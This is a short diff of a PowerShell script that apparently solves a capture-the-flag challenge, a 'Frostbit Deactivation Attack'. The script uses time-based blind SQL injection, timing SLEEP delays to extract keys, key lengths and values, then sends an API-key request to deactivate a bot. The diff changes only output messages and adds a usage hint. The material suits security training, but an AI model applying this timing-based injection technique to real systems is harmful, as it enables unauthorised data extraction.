@@ -191,7 +191,7 @@ if(Test-Path -Path key-candidates.txt){
     $sw.Stop()
 
     if($sw.ElapsedMilliseconds -ge $sleeperrormargin){
-        "Number of keys in doc: " + $_
+        "Found: " + $_
     }
 }
 
@@ -211,7 +211,7 @@ if(Test-Path -Path key-candidates.txt){
     $sw.Stop()
 
     if($sw.ElapsedMilliseconds -ge $sleeperrormargin){
-        "Number of keys in doc: " + $_
+        "Found: " + $_
     }
 }
 
@@ -232,7 +232,7 @@ if(Test-Path -Path key-candidates.txt){
     $sw.Stop()
     
     if($sw.ElapsedMilliseconds -ge $sleeperrormargin){
-        "Length of key in doc: " + $_
+        "Found: " + $_
         $len = $_ - 1
     }
 }
@@ -280,7 +280,7 @@ foreach($pos in 0..$len){
     $sw.Stop()
 
     if($sw.ElapsedMilliseconds -ge $sleeperrormargin){
-        "Length of key's value in doc: " + $_
+        "Found: " + $_
         $len = $_ - 1
     }
 }
@@ -322,6 +322,9 @@ if($Deactivate){
     "X-API-Key"="$apikey"
     })
     ($resp.Content | ConvertFrom-Json).message
+}
+else{
+    "Add the '-Deactivate' switch to automatically deactivate the publication of the naughty_nice_list.csv file"
 }
 $swtotal.Stop()
 "`nCompleted Frostbit Deactivation Attack for BotUUID $botuuid and SQLi SLEEP($sleepytime) on $(Get-Date)"
